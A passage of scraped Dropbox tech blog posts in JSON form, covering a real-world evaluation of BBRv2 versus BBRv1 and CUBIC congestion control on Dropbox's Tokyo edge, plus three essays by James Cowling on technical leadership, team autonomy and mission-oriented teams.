microwave-assisted magnetic recording (MAMR) drives or heat assisted magnetic recording (HAMR) drives—but they will have the same interface and we’ll be able to use the same software architecture. We’re already working on further improving densities with our 2020 storage designs. By jumping to SMR, we’ve opened the door for whatever emerging technologies are coming. For Dropbox, the end result is more cost-efficient storage with a smaller energy footprint without sacrifice in reliability or performance. For the industry overall, our efforts will pay dividends as the underlying architecture is adopted for future enhancements in HDD technology. Acknowledgements: Refugio Fernandez, Preslev Le, Victor Li, and Alexander Sosa contributed to this article. Interested in how our SMR technology will change the future of cloud storage? We’re hiring ! // Tags Infrastructure Hardware Magic Pocket Smr // Copy link Link copied Link copied", "date": "2019-07-30"},
{"website": "Dropbox", "title": "Evaluating BBRv2 on the Dropbox Edge Network", "author": ["Rbtz060917"], "link": "https://dropbox.tech/infrastructure/evaluating-bbrv2-on-the-dropbox-edge-network", "abstract": "BBRv1 Congestion Control Meet BBR version 2 Disclaimers Test setup Experimental results Conclusions We’re hiring! Appendix A. BBRv2 Development Appendix B. Explicit Congestion Notification Appendix C. Beyond As Fast As Possible Appendix D. Nginx Throughput Graphs Spoiler alert: BBRv2 is slower than BBRv1 but that’s a good thing. BBRv1 Congestion Control Three years have passed since “ Bottleneck Bandwidth and Round-trip ” (BBR) congestion control was released. Nowadays, it is considered production-ready and added to Linux, FreeBSD, and Chrome (as part of QUIC.) In our blogpost from 2017, “ Optimizing web servers for high throughput and low latency ,” we evaluated BBRv1 congestion control on our edge network and it showed awesome results: Desktop client’s download bandwidth during BBR experiment in 2017. Since then, BBRv1 has been deployed to Dropbox Edge Network and we got accustomed to some of its downsides. Some of these were eventually fixed, like it being measurably slower for Wi-Fi users. Other tradeoffs were quite conceptual: BBRv1’s unfairness towards loss-based congestion controls (e.g. CUBIC, Compound), RTT-unfairness between BBRv1 flows , and (almost) total disregard for the packet loss: Initial BBRv1 deployment: some boxes have >6% packet loss. BBR developers (and IETF ICCRG) were, of course, also quite aware of these problems and actively worked on solutions. Following issues were identified : Low throughput for Reno/CUBIC flows sharing a bottleneck with bulk BBR flows Loss-agnostic; high packet loss rates if bottleneck < 1.5*BDP ECN-agnostic Low throughput for paths with high degrees of aggregation (e.g. wifi) Throughput variation due to low cwnd in PROBE_RTT Meet BBR version 2 BBRv2 aims to solve some major drawbacks of the first version , from lack of concern for packet loss to not giving enough room for new flows to enter. Plus, it also enhances network modeling with aggregation/in-flight parameters and adds experimental support for ECN (explicit congestion notification). CUBIC BBR v1 BBR v2 Model parameters for the state machine N/A Throughput, RTT Throughput, RTT, max aggregation, max inflight Loss Reduce cwnd by 30% on window by any loss N/A Explicit loss rate target ECN RFC3168 (Classic ECN) N/A DCTCP-inspired ECN Startup Slow-start until RTT rises (Hystart) or any loss Slow-start until throughput plateaus Slow-start until throughput plateaus or ECN/Loss rate > target As BBRv2 is getting closer to release, we decided to take it for a spin on Dropbox Edge Network and see how it handles our workloads. But before we get into experimental results (and somewhat pretty pictures), lets cover disclaimers and test setup. Disclaimers Not a low-latency experiment This experiment was aimed at high-throughput workloads, not latency-sensitive ones. All TCP connections and nginx logs mentioned in the post were filtered by having at least 1Mb of data transferred. Eventually, we may decide on deploying BBRv2 internally in datacenters (possibly even with ECN support) for RPC traffic but that is outside the scope of this post. Not a single connection test This experiment was performed in a single PoP (point of presence), but on boxes handling millions of connections, so no single connection troubleshooting, tcptrace drill-downs, nor tcpdumps were involved. What follows is a mix of summary statistics, Jupyter notebooks, pandas, and seaborn. Even though seaborn facilitates the creation of pretty graphs , I’ve mostly failed at that, so sorry in advance for the poor graphs’ quality. OTOH, at least it’s not xkcd-style =) This is not a lab test This is a real-world experiment on our edge network. If you want to test BRRv2 (or any other congestion control) in a lab environment, we would recommend using github.com/google/transperf , that allows “Testing TCP performance over a variety of emulated network scenarios (using netem ), including RTT, bottleneck bandwidth, and policed rate that can change over time,” like this: An example of a transperf run. Test setup We used a set of machines in our Tokyo PoP and tested the following combinations of kernels/congestion control algorithms: 5.3 kernel, cubic 5.3 kernel, bbr1 5.3 kernel, bbr2 4.15 kernel, bbr1 All of the servers are using a combination of mq and sch_fq qdiscs with default settings. Kernel is based on Ubuntu-hwe-edge-5.3.0-18.19_18.04.2 with all the patches from the v2alpha-2019-11-17 tag: The set of BBRv2 patches on top of Ubuntu-hwe-edge-5.3.0-18.19_18.04.2 We’ve also applied “ tcp: Add TCP_INFO counter for packets received out-of-order ” for the ease of merging and “ [DBX] net-tcp_bbr: v2: disable spurious warning ” to silence the following warning: Copy WARNING: CPU: 0 PID: 0 at net/ipv4/tcp_bbr2.c:2426 bbr_set_state [tcp_bbr2] All the graphs in the post were generated from either connection-level information from ss -neit sampling, machine-level stats from /proc , or server-side application-level metrics from web-server logs. Keeping the kernel up-to-date Newer kernels usually bring quite a bit of improvement to all subsystems including the TCP/IP stack. For example, if we compare 4.15 performance to 5.3, we can see that the latter has ~15% higher throughput, based on the web server logs: 4.15 vs 5.3 median file download throughput from Nginx point of view. Most likely candidates for this improvement are “ tcp_bbr: adapt cwnd based on ack aggregation estimation ” (that fixed the Wi-Fi slowness mentioned above) and “ tcp: switch to Early Departure Time model ” (which we’ll talk about later in the AFAP section.) Recent Linux kernels also include mitigations for the newly discovered CPU vulnerabilities . We highly discourage disabling them (esp. on the edge!) so be prepared to take a CPU usage hit. Keeping userspace up-to-date Having recent versions of userspace is quite important if you are using newer versions of the kernel compared to what your OS was bundled with. Especially so for packages like ethtool and iproute2. Just compare the output of an ss command with the old version: Copy $ ss -tie\nts sack bbr rto:220 rtt:16.139/10.041 ato:40 mss:1448 cwnd:106\nssthresh:52 bytes_acked:9067087 bytes_received:5775 segs_out:6327\nsegs_in:551 send 76.1Mbps lastsnd:14536 lastrcv:15584 lastack:14504\npacing_rate 98.5Mbps retrans:0/5 rcv_rtt:16.125 rcv_space:14400 …versus the new one: Copy $ ss -tie\nts sack bbr rto:220 rtt:16.139/10.041 ato:40 mss:1448 <strong>pmtu:1500</strong>\nrcvmss:1269 <strong>advmss:1428</strong> cwnd:106 ssthresh:52 bytes_sent:9070462\n<strong>bytes_retrans:3375</strong> bytes_acked:9067087 bytes_received:5775\nsegs_out:6327 segs_in:551 data_segs_out:6315 data_segs_in:12\n<strong>bbr:(bw:99.5Mbps,mrtt:1.912,pacing_gain:1,cwnd_gain:2)</strong>\nsend 76.1Mbps lastsnd:9896 lastrcv:10944 lastack:9864\npacing_rate 98.5Mbps delivery_rate 27.9Mbps delivered:6316\nbusy:3020ms <strong>rwnd_limited:2072ms(68.6%)</strong> retrans:0/5 dsack_dups:5\nrcv_rtt:16.125 rcv_space:14400 <strong>rcv_ssthresh:65535</strong> <strong>minrtt:1.907</strong> As you can see, the new ss version has all the goodies from the kernel’s struct tcp_info , plus the internal BBRv2 state from the struct tcp_bbr_info . This adds a ton of useful data that we can use even in day-to-day TCP performance troubleshooting, for example, insufficient sender buffer and insufficient receive window/buffer stats from the “ tcp: sender chronographs instrumentation ” patchset. Experimental results Low packet loss First things first, immediately after enabling BBRv2 we observe an enormous drop in retransmits. Still not as low as CUBIC, but a great improvement. Also, given that BBR was designed to ignore non-congestion induced packet loss, we can probably say that things work as intended. RetransSegs %, for Cubic, BBRv1, and BBRv2. If we dig deeper and look at ss stats we can see that generally, BBRv2 has way lower packet loss than BBRv1 (note the logarithmic scale) but still way higher than CUBIC: One strange experimental result is that BBRv2 has connections with >60% packet loss, which are present neither on BBRv1 nor CUBIC machines. Looking at some of these connections closer does not reveal any obvious patterns: connections with absurdly large packet loss come from different OS’es (based on Timestamp/ECN support,) connections types (based on MSS,) and locations (based on RTT.) Aside from these outliers, retransmissions are lower across all RTTs: Somehow, hosts using BBRv2 observe a lower degree of reordering, though this may be a side effect of fewer segments in-flight: Throughput From the Traffic team perspective one of our SLIs for edge performance is end-to-end client-reported file download speed. For this test, we’ve been using server-side file download speed as the closest proxy. Here are the results comparing file download speed from the nginx point of view: BBRv2 versus both BBRv1 and CUBIC: Median nginx throughput, 95% ci (for files >1Mb.) P75 nginx throughput, 95% ci (for files >1Mb.) For lower percentiles of connection speeds, BBRv2 has performance is closer to CUBIC and for higher ones it starts getting closer to BBRv1. Connection-level stats confirm that BBRv2 has lower bandwidth than BBRv1, but still higher than CUBIC: So, is BBRv2 slower? It is, at least to some extent. So, what are we getting in return? Based on connection stats, quite a lot actually. We’ve already mentioned lower packet loss (and therefore higher “goodput”), but there is more. Fewer packets in-flight We’ve observed way fewer “unacked” packets which is a good proxy for bytes in-flight. BBRv2 looks way better than in BBRv1, and even slightly better than CUBIC: Plotting RTT (round-trip time) versus in-flight shows that in BBRv1 case amount of data in-flight tends to be dependent on the RTT, which looks fixed in BBRv2: As one of BBR co-authors, Neal Cardwell, explains : In all of the cases I've seen with unfairness due to differing min_rtt values, the dominant factor is simply that with BBRv1 each flow has a cwnd that is basically 2 bw min_rtt, which tends to try to maintain 1 bw min_rtt in the bottleneck queue, which quite directly means that flows with higher min_rtt values maintain more packets in the bottleneck queue and therefore get a higher fraction of the bottleneck bandwidth. The most direct way I'm aware of to improve RTT fairness in the BBR framework is to get rid of that excess queue, or ensure that the amount of queue is independent of a flow's min_rtt estimate. Receive Window Limited connections We also observe that BBRv2 connections spend way less time being “receive window limited” than BBRv1 and CUBIC connections do: I would assume that CUBIC without sch_fq would look even worse than BBRv1. Lower RTT As a bonus BBRv2 also has a lower RTT than BBRv1, but strangely higher than CUBIC: Correlations between Min RTT and Bandwidth If we construct Min RTT vs Bandwidth graph then vertical bands represent a network distance from user to our Tokyo PoP while horizontal bands represent common Internet speeds: bbr_mrtt vs bbr_bw scatterplot of all BBR flows in the experiment (both BBRv1 and BBRv2.) What’s interesting here is the exponentially decaying relationship between MinRTT and bandwidth for both BBRv1 and BBRv2. This means that there are some cases where bandwidth is artificially limited by RTT. Since this behavior is the same between BBRv1 and BBRv2 we did not dig too much into it. It’s likely though that bandwidth is being artificially limited by the user’s receive window. The 130+ ms RTT band represents cross-Pacific traffic and hence very likely a GSLB failure to properly route users to the closest PoP. We’ll talk about how we are utilizing RUM data to avoid that in the following blog post. CPU Usage Improvements Previously, BBRv1 updated the whole model on each ACK received, which is quite a lot of work given the millions of ACKs that an average server receives. BBRv2 has an even more sophisticated network path model but it also adds a fast path that skips model updates for the application-limited case . This, in theory, should greatly reduce CPU usage on common workloads. ACK fast-path is not the only optimization that was made, feel free to check out the full list of optimizations in the BBR’s IETF ICCRG 106 presentation . In our tests, though, we did not see any measurable difference in CPU usage between BBRv1 and BBRv2, but this is likely due to BBRv2 having quite a lot of debug code enabled (for now:) Idle CPU on BBRv1 vs BBRv2. Pay special attention to the CPU usage if you are testing BBR with ECN enabled since it may render GRO/GSO unusable for high packet loss scenarios. Conclusions In our testing BBRv2 showed the following properties: Bandwidth is comparable to CUBIC for users with lower percentiles of Internet speeds. Bandwidth is comparable to BBRv1 for users with higher percentiles of Internet speeds. Packet loss is 4 times lower compared to BBRv1*; still 2x higher than CUBIC. Data in-flight is 3 times lower compared to BBRv1; slightly lower than CUBIC. RTTs are lower compared to BBRv1; still higher than CUBIC. Higher RTT-fairness compared to BBRv1. Overall, BBRv2 is a great improvement over the BBRv1 and indeed seems way closer to being a drop-in replacement for Reno/CUBIC in cases where one needs slightly higher bandwidth. Adding experimental ECN support to that and we can even see a drop-in replacement for Data Center TCP (DCTCP) . * Minus the 0.0001% of outliers with a >60% packet loss. We’re hiring! If you are still here, there is a good chance that you actually enjoy digging deep into the performance data and you may enjoy working on the Dropbox Traffic team! Dropbox has a globally distributed Edge network, terabits of traffic, and millions of requests per second. All of which is managed by a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and loadbalancers , HTTP/gRPC proxies , and our internal gRPC-based service mesh . Not your thing? Dropbox is also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . Appendix A. BBRv2 Development Development happens on github.com/google/bbr . Discussions are happening on the bbr-dev mailing list. Here is the list of BBR design principles ( bold means it’s new v2): Leave headroom: leave space for entering flows to grab React quickly: using loss/ECN, adapt to delivery process now to maintain flow balance Don't overreact: don't do a multiplicative decrease on every round trip with loss/ECN Probe deferentially: probe on a time scale to allow coexistence with Reno/CUBIC Probe robustly: try to probe beyond estimated max bw, max volume before we cut est. Avoid overshooting: start probing at an inflight measured to be tolerable Grow scalably: start probing at 1 extra packet; grow exponentially to use free capacity Here are some notable milestones in BBRv2 development to date: BBR v2 algorithm was described at IETF 104: Prague, Mar 2019 [ video ] [ slides ] BBR v2 open source release was described at IETF 105: Montreal, July 2019 [ video ] [ slides ] BBR v2 performance improvements and fixes IETF 106: Singapore, Nov 2019 [ video ] [ slides ] Appendix B. Explicit Congestion Notification ECN is a way for the network bottleneck to notify the sender to slow down before it runs out of buffers and starts “tail dropping” packets. Currently, though, ECN on the Internet is mostly deployed in a so-called “passive” mode. Based on Apple’s data 74+% most popular websites “passively\" support ECN . On our Tokyo PoP, we currently observe 3.68% of connections being negotiated with ECN, 88% of which have an ecnseen flag. There are a lot of upsides to using ECN both internally and externally, as described in “ The Benefits of Using Explicit Congestion Notification (ECN) ” RFC. One of the downsides of Classic ECN (a.k.a RFC3168 ) is that it is too prescriptive about explicit congestion signal: Copy Upon the receipt by an ECN-Capable transport of a single CE packet, the congestion control algorithms followed at the end-systems MUST be essentially the same as the congestion control response to a *single* dropped packet.\n...\nThe indication of congestion should be treated just as a congestion loss in non-ECN-Capable TCP. That is, the TCP source halves the congestion window \"cwnd\" and reduces the slow start threshold \"ssthresh\". (And for a good reason, since any difference in behavior between explicit (CE mark) and implicit (drop) congestion will definitely lead to unfairness.) Other RFCs, like the “ Problem Statement and Requirements for Increased Accuracy in Explicit Congestion Notification (ECN) Feedback ,” call out the low granularity of classic ECN that is only able to feedback one congestion signal per RTT. Also for a good reason: DCTCP (and BBRv2) implementation of ECN greatly benefits from its increased accuracy: M. Alizadeh et al. Data Center TCP (DCTCP). DCTCP’s custom interpretation of CE leads to a total unfairness towards classic congestion control algorithms. RFC8311, “ Relaxing Restrictions on Explicit Congestion Notification (ECN) Experimentation ” tries to fix this by relaxing this requirement so that implementations are free to choose behavior outside of one specified by Classic ECN. Talking about ECN it’s hard to not mention that there is also a “ congestion-notification conflict ” going over a single code point (a half a bit) of space in the IP header between the “ Low Latency, Low Loss, Scalable Throughput (L4S) ” proposal and the bufferbloat folks behind the “ The Some Congestion Experienced ECN Codepoint (SCE) ” draft. As Jonathan Corbet summarizes it: These two proposals are clearly incompatible with each other; each places its own interpretation on the ECT(1) value and would be confused by the other. The SCE side argues that its use of that value is fully compatible with existing deployments, while the L4S proposal turns it over to private use by suitably anointed protocols that are not compatible with existing congestion-control algorithms. L4S proponents argue that the dual-queue architecture is necessary to achieve their latency objectives; SCE seems more focused on fixing the endpoints. Time will show which, if any, draft is approved by IETF, in the meantime, we can all help the Internet by deploying AQMs (e.g. fq_codel , cake ) to the network bottlenecks under our control. There is an RFC for that too, namely, “ IETF Recommendations Regarding Active Queue Management ”, that has a whole section on AQMs and ECN. Appendix C. Beyond As Fast As Possible “Evolving from AFAP – Teaching NICs about time” There is a great talk by Van Jacobson about the evolution of computer networks and that sending “as fast as possible” is not an optimal in today’s Internet and even inside a datacenter. You can checkout slides and video of Van Jacobson’s netdev talk. Coverage is available from Julia Evans (@ b0rk ) and LWN.net (@ BPismenny ). This talk is a great summary of the reasons why one might consider using pacing on the network layer and a delay-based congestion control algorithm. Fair Queue scheduler Quite often we mention that all our Edge boxes run with Fair Queue scheduler: Copy $ tc -s qdisc show dev eth0\nqdisc mq 1: root\n Sent 100800259362 bytes 81191255 pkt (dropped 122, overlimits 0 requeues 35)\n backlog 499933b 124p requeues 35\nqdisc fq 9cd7: parent 1:17 limit 10000p flow_limit 100p buckets 1024 orphan_mask 1023 quantum 3028 initial_quantum 15140 low_rate_threshold 550Kbit refill_delay 40.0ms\n Sent 1016286523 bytes 806982 pkt (dropped 0, overlimits 0 requeues 0)\n backlog 0b 0p requeues 0\n 2047 flows (2044 inactive, 0 throttled)\n 6162 gc, 0 highprio, 43782 throttled, 2716 ns latency\n... We also mention that our main goal is not the fair queueing itself but pacing introduced by tc-fq. Earlier fq implementations did add some jitter to TCP’s RTT estimations which can be problematic inside the data center since it will likely inflate p99s of RPC requests. This was solved in “ tcp: switch to Early Departure Time model .” Here is an example of pacing at work: let’s use bpftrace to measure difference between packets are enqueued into the qdisc and dequeued from it: Copy # bpftrace qdisc-fq.bt\n@us:\n[0]               237486 |                                                    |\n[1]              8712205 |@@@@@@@@@@@@@@@@@@@@                                |\n[2, 4)          21855350 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[4, 8)           4378933 |@@@@@@@@@@                                          |\n[8, 16)           372762 |                                                    |\n[16, 32)          178145 |                                                    |\n[32, 64)          279016 |                                                    |\n[64, 128)         603899 |@                                                   |\n[128, 256)       1115705 |@@                                                  |\n[256, 512)       2303138 |@@@@@                                               |\n[512, 1K)        2702993 |@@@@@@                                              |\n[1K, 2K)        11999127 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        |\n[2K, 4K)         5432353 |@@@@@@@@@@@@                                        |\n[4K, 8K)         1823173 |@@@@                                                |\n[8K, 16K)         778955 |@                                                   |\n[16K, 32K)        385202 |                                                    |\n[32K, 64K)        146435 |                                                    |\n[64K, 128K)        31369 |                                                    | qdisc-fq.bt is a part of supplementary material to the “ BPF Performance Tools: Linux System and Application Observability ” book by Brendan Gregg. Appendix D. Nginx Throughput Graphs // Tags Infrastructure Traffic Edge Network // Copy link Link copied Link copied", "date": "2019-12-17"},
{"website": "Dropbox", "title": "Embracing papercuts", "author": ["Jamesacowling"], "link": "https://dropbox.tech/infrastructure/embracing-papercuts", "abstract": "Team growth requires giving people room to make mistakes. Figuring out which mistakes are just “papercuts” and which are critical is one of the most difficult challenges in engineering leadership. We’ve all seen “helicopter parents,” hovering over their kids to catch them at the slightest inclination they might fall. We swear we’d never do that, that we’d give our kids room to grow and learn from mistakes. Then we become tech leads and turn into the worst kind of “helicopter leaders.” I was certainly guilty of micromanagement. It started with code reviews, commenting on every minor issue I could find. Hey, just setting a high quality bar. Then it moved to second-guessing every design decision in the team. Just making sure we’re on track! I probably should have noticed something was wrong when I started becoming the bottleneck for the team, but to be honest I didn’t really notice until some of my teammates started getting pissed off with me. We’re now great friends but it got a little tense for a while! Get out the way A team of strong engineers will outgrow you. If you’re involved in every minor decision then the team will end up being under-utilized. You want to have a team of engineers , not code-monkeys, so treat them as engineers and give them room to do their job. The best way your team will learn and grow is for them to take ownership, make mistakes, and learn from these. These are far more valuable growth experiences than whatever they read about on some blog ( cough ). It’s not just about empowering others though, you have shit to do yourself! If you spend 100% of your time on day-to-day decision-making then you’re spending 0% of your time on longer-term strategy. If you drop the ball on the latter no one is there to catch it for you, so don’t spend all your time on everyone else’s problems. Raise your standards Surprise! This is not the section where I tell you to just relax and let your team screw stuff up. Don’t do that. The point of letting your team make “papercuts” is to produce a net benefit to the company ; we’re not running a charity here! Your people need autonomy so they can reach their full potential. They need room to make mistakes so they can learn, and they need the organizational air-cover from you to allow them to do so. No one is learning anything unless there’s accountability for quality and execution though, otherwise we’re just being sloppy. Autonomy goes hand in hand with setting expectations , asking when projects will be completed, and reflecting on whether work was successful. You’re not going to go far by bullshitting your team though, so no need to pretend you agree with them. Some of the most motivating phrases you can say to an engineer are: I don’t know if I agree with you, but this decision is on you. You can do this. Roll with it, but this is what I expect... or Let me know if you need any input but otherwise I’m going to stay out of this one. You know what we need and when we need it by. You’re in charge here. Knock it out the park. Say one of these and watch the output of your team members sky-rocket… well, hopefully. Engineering productivity is critically tied to motivation level. Autonomy coupled with high standards is a huge motivator to talented engineers. Type 1 vs Type 2 decisions This all seems like fine management mumbo-jumbo but where does the hard part come in? Just in case we got too touchy-feely for a minute there: If you give your team autonomy and disaster strikes then that is your fault. You are accountable for the direction and execution of the team, you can’t just take your hands off the wheel. You take a risk when you give others autonomy. The safe option is just to micromanage the shit out of your team — you’ll get mediocre output from mediocre people, while your good people go work somewhere else. That’s not what you’re all about though right? The real art to insightful technical leadership is figuring out which decisions might end up with someone losing a metaphorical arm or leg and which might just result in a papercut. Jeff Bezos calls these Type 1 and Type 2 decisions . Type 1 decisions are big hard-to-reverse decisions with serious implications for getting it wrong. Type 2 decisions aren’t such a big deal, you can back out of them or change course later. You absolutely need to be on top of Type 1 decision-making, just don’t go overboard worrying about the Type 2 stuff. There’s no easy answer for what is Type 1 and what is Type 2. You’ll have to use your brain for this unfortunately. As some general guidance I tend to think of the following as Type 1 in the context of software engineering: External APIs, at least the major details. Distributed systems protocols. Standards for correctness, validation, and reliability. Security decisions. Whether to devote a lot of resources to a project, e.g., a major system rewrite. Long-term team strategy. Other stuff? Well a lot of it is ok so long as a smart person is being held to high standards. Want to use library X instead of library Y internally in a project? Go for it, I don’t care. If you’re a senior engineer in a design review, consider whether you should just be telling people something is a Type 2 decision instead of being too heavy-handed. If you’re a more junior engineer looking for feedback, consider first getting input on whether it’s a Type 1 or Type 2 decision. If you just go in asking for design feedback you’re probably going to get it, whether you like it or not. You might be wrong This post has already gone too far towards making the tech lead seem like some kind of special genius. You are probably not a special genius. One of the best things about allowing people to “experience papercuts” is that very often they don’t result in papercuts after all. It turns out you were just wrong. There’s a good chance your engineers know more about their particular part of the stack than you, and there’s a good chance they’ve thought about a particular decision more than you have. Sure they might not be as experienced, but there’s a good chance they’ll prove you wrong. Usually what happens is just that the decision didn’t really matter that much after all — you were both right. Or maybe we wasted some time but the engineer worked much harder because they had ownership — it all balanced out. Focus on the medium-term output of the team, not the short-term. Being proven wrong is a great way to achieve more as a group than you ever could by yourself. Crawl before you ball This is hopefully obvious but this is all about empowering people who are ready for that responsibility. Junior folks are going to need some hand-holding even with Level 2 decisions. This also doesn’t absolve you from responsibility for giving advice and guidance on issues both large and small. If team members are feeling overwhelmed then you’ve gone too far. Don’t throw your intern to the sharks. Summary Give your team autonomy for decision-making and allow them to accumulate some “papercuts” but hold the team to high standards. Exercise your judgement to figure out which decisions are critical and which are reversible. A team will grow faster and be more productive when people are given ownership and accountability. If it turns out we screwed up a little and wasted some time? Well we’ll just have to step it up more next time. Thanks to Akhil Gupta for giving me a ream of paper as a junior tech lead and letting me accumulate a lifetime of papercuts. View original post on Medium. // Tags Infrastructure Leadership Culture // Copy link Link copied Link copied", "date": "2019-04-17"},
{"website": "Dropbox", "title": "Don’t lead by example", "author": ["Jamesacowling"], "link": "https://dropbox.tech/infrastructure/dont-lead-by-example", "abstract": "Leadership requires setting expectations Everyone shovels the sh** Summary This is the first in a series of posts that Dropbox Principal Engineer James Cowling has published on his personal Medium blog about technical leadership. Being a strong tech lead is very different from being a strong engineer and we thought the readers of our tech blog would find his experiences relevant and interesting. Back when I was a first-time tech lead at Dropbox I had the misfortune of juggling two intimidating responsibilities at the same time: Build a multi-exabyte distributed storage system and migrate our data off Amazon S3, with limited resources and an extremely tight timeframe. Figure out what the hell I was doing as a tech lead. The latter turned out to be far more challenging. Everything was great when the team was small but as we expanded the growing pains started to set in. I didn’t feel like everyone was doing their share of the dirty work. It felt like the same few people were always jumping in to help with emergencies, respond to alerts, fix dashboards, and keep the lights on. I was one of those people, and I was starting to get frustrated. My solution to this problem was to “show people how it’s done.” I tried increasingly hard to set a good example: jumping on every pager alert immediately, being the first one to respond to team emails, constantly fielding questions on chat. I was working 16 hour days and struggling to get the team on board, while instead just going overboard. You can guess where this is going. The more I jumped in the more the rest of the team felt crowded out, the more they wondered if it was easier for me to solve a given issue, the more micromanaged and disempowered they felt, the more they suspected that maybe I just liked working all the time, and the more confused I got that people weren’t following my lead. The result of this effort was that the team members felt less happy, I felt more burned out, and less was getting done. That was all until a more experienced lead pulled me aside and said “hey, stop trying to lead by example.” It took me a while to figure out what that means. Leadership requires setting expectations We all need to set a good example but trying to lead by example is weak at best and passive-aggressive at worst. A good leader needs to communicate clearly, to set expectations, and to take an active role in directing team members. Time to suck it up and own your role. In the specific case above all it required was having an explicit discussion with the team about expectations and responsibilities for people who are on-call. This felt pretty awkward at the time but the team appreciated the clarity. It also required me to chill out a bit: it turns out that emails don’t have to be responded to instantly and the sky isn’t always falling. By codifying expectations I was forced to reason about which ones were valuable and which ones were just me being a micromanager. Expectation-setting dovetails nicely with the concept of accountability — actually holding people responsible for meeting expectations. This is a big topic on its own and worthy of another blog post, but the high-level point is that a team of highly talented engineers thrive most in an environment of accountability as opposed to an environment of oversight . Guess what’s required in order to hold people accountable to expectations? Actually setting them. Everyone shovels the sh** Ok cool, now you’ve been all “leveraged” by setting expectations. Time to sit back and watch the team do the work right? Whoa whoa, put down the top hat and monocle and pick up that shovel again. Modern tech workers can be an anti-authoritarian bunch at the best of times. If you see your role as bossing people around you’re going to lose the faith of your team almost instantly. Expectation-setting is a required part of a tech lead’s job, but you’re a member of the team too, you still need to get in there and do the actual work. Being on the ground with the team helps you ensure a high quality bar, helps you understand what’s going on with your system, allows you to build empathy for your teammates, and helps make sure your team hits its goals. You’ll likely be the hardest-working person on your team. Congratulations, welcome to tech leadership. Summary “Leading by example” doesn’t work. Setting a good example is necessary, but isn’t sufficient for strong technical leadership. Acting like a tech lead means setting clear expectations and embracing direct communication… but don’t let the role go to your head: you’re a member of a team not the boss of the team. Special thanks to Kate Heddleston for feedback on this post and to Andrew Fong for pointing an amateur tech lead in the right direction. Extra-special thanks to the Magic Pocket team for being an incredible group of engineers and for putting up with me when I was figuring this stuff out. View original post on Medium. // Tags Infrastructure Leadership Culture // Copy link Link copied Link copied", "date": "2019-02-21"},
{"website": "Dropbox", "title": "Your System is not a Sports Team", "author": ["Jamesacowling"], "link": "https://dropbox.tech/infrastructure/your-system-is-not-a-sports-team", "abstract": "System bias Defining a mission Avoiding silos Summary It’s the responsibility of an engineering team to do what’s right for the company, not to advocate for the system they own. Engineering teams need to be oriented around a mission not a system to avoid narrow-minded decision-making. Do you have a team at your company called the Kafka Team, or the HBase Team, or the Docker Team? Hmm, you may have screwed up. Don’t worry, there’s time to fix this. Years ago at Dropbox we started the Magic Pocket team to design and build the block storage system of the same name. It was a silly internal codename that somehow ended up sticking. The Magic Pocket team had a lot of successes but as soon as the system was stable and launched in production I had the team go through all the effort of rebranding to the Storage Infrastructure Team. This was a huge pain and prompted a lot of eye-rolling from folks who saw this as a meaningless management gesture. At least in this one occasion there was some method to this madness. The method here is that this is the team of block storage domain experts at the company. If the system ever ceases to meet our needs and we need to pursue an alternative, this is the team that needs to advocate for that strategy. Magic Pocket is not a sport team and and our people not a bunch of zealous fans. They’re highly skilled engineers with a responsibility to design, build, and operate the best storage system in the world. If we can’t trust that team to drive this strategy who can we trust? Orienting a team around a mission and not a specific system is critical to ensure that their priorities are aligned with what’s best for the company. The Storage Infrastructure team mission was brought into sharp focus when our lead engineer proactively killed a cold-storage project that he was in charge of. The system was “his baby,” but he felt like it turned out being excessively complex and not in the long-term interest of the company. People who make these kinds of decisions are the ones you want to celebrate. As a fortunate twist he came up with a far simpler and better design a few days later. We end up launching it ahead of schedule. It’s nice when things work out like that. System bias It’s natural to be biased towards a system you’ve spent countless hours building or operating. We’ve all seen examples of “system bias” gone wrong. This can sometimes be painfully obvious: the team spending six months to improve performance by 10% when it was completely fine to begin with; the team trying to desperately force their tooling on clients who are better off without it; the team riding their outdated system to the grave like the captain going down with the Titanic. System bias can also show up in far more insidious ways. If a team views their responsibility as owning and advocating for a system then they’ll find creative ways to fill up sprint plans with work on that system, whether or not that actually matters. The same problem happens within a team when an engineer is a DRI (Directly Responsible Individual) for a specific system or sub-component. You’ll start seeing features get developed that are good in theory, but which we’d be fine without. There’s always something to work on on a given system, you can always polish that gemstone a little more, but that doesn’t mean it’s worthwhile doing so. Many engineers have a tendency to focus inwardly on improving their pet system, unless encouraged to have a broader outlook by virtue of a mission that’s aligned with company value. One question I like to ask engineers is: If we could be spending these resources working on  any project at the company right now, would this still be the best use of our time? If the answer to this question is “no” then you might have scoped your mission too tightly. Either that or you’re over-staffed! (You’re probably not over-staffed.) Defining a mission If system bias is a natural consequence of a sense of ownership, we’re certainly not doing the team any favors by burdening them further with a job description that codifies this bias. Orient your team around the problem you solve, not the tools you use to do it. Someone else can probably give you better advice on how to define a mission than me. It should be focused enough to give a sense of team identity but broad enough so as to not codify any implementation decisions. It should also be short — one or two sentences. Start by asking yourself “what problem do we solve?” That’s probably your mission. Avoiding silos Organizational structures can lead to excessive constraints on the mission of a team. Sometimes this is just an inevitable consequence of a large company. The more lightweight these structures are the more engineers will be empowered to focus on broad company impact in their decision-making, rather than staring at their shoes and only thinking about their own system. For a tech lead it’s usually easier to reason about system bias within a team. If a team is split up into too many small silos the engineers within a silo will be forced to prioritize their tiny domain. Formal structures like tech leads can serve to make this even worse if the domains are particularly small. I tend to prefer establishing DRIs for sub-priorities with a team. The DRI is responsible for a sub-priority or sub-component but it’s not their identity ; they’re still expected to work on other stuff on the team and to focus their energies on whatever matters most to the team as a whole. Summary You want your engineers to focus on solving problems that matter, not on advocating for systems they own. Establish a mission for the team and make that mission your team identity. View original post on Medium. // Tags Infrastructure Leadership Culture // Copy link Link copied Link copied", "date": "2019-06-06"},
